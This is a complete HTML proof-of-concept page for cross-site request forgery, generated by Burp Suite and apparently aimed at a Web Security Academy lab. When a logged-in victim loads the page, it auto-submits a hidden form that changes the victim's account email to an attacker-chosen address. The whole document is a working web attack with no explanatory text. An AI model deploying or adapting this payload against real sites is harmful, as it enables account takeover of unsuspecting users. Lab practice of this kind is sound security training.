<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a8000ab041d378580261c8400150058.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="van&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>